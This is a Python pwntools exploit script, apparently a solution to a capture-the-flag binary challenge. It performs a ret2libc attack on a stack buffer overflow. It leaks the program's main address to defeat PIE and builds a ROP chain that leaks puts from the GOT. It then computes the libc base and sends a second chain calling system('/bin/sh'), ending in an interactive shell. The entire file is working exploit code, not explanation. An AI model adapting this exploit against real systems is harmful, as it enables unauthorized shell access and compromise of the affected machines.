from pwn import *
from pprint import pprint
import struct

offset = 40

elf = ELF("./pwn")
p = elf.process()
# p = remote("ce441-pwn2.pwni.top",1337)
context.arch = 'amd64'



################  DEBUG TOOLS #####################

# context.terminal = ['tmux','splitw', '-h']
# gdb.attach( p, '''
#     c
# '''
# )

##################################################

# libbb = elf.symbols['libc']

first_line = p.recvuntil("\n")
main_address = first_line.decode().split(" ")[7].strip()
hex_addr = int(main_address,16)
elf.address = hex_addr - elf.symbols['main']


rop = ROP(elf)
rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols["vuln"])



#print("stoort --------->",hex_addr)
# pprint(elf.symbols)
print(first_line) 
p.recvuntil("\n")

payload = [
    b"A"*offset,
    rop.chain()
]
#print("---------------->",hex(elf.symbols['main']),hex(hex_addr))
payload = b"".join(payload)
p.sendline(payload)
print("tito",p.recvuntil("\n"))
puts = u64(p.recvuntil("\n").rstrip().ljust(8,b"\x00"))
log.info(f"puts found at {hex(puts)}")
# log.info(f"puts found at {hex(puts)}")

libc = ELF("libc6_2.35-0ubuntu3.4_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address {hex(libc.address)}")
# print("-------------------------->",libc.symbols["puts"])

bin_sh = next(libc.search(b"/bin/sh\x00"))

print("jamalllllll",hex(bin_sh))


rop = ROP(libc)
rop.call(libc.symbols["puts"],[next(libc.search(b"/bin/sh\x00"))])
# pprint(libc.symbols)
rop.call(libc.symbols["system"],[next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.symbols["exit"])

print("yipiii",p.recvuntil("\n"))
payload = [
    b"A"*offset,
    rop.chain()
]
payload = b"".join(payload)
with open("payload","wb") as h:
    h.write(payload)

p.sendline(payload)
# print("zhito",p.recvuntil("\n"))

# pp = p.recvuntil("\n")
# log.info(pp)


p.interactive()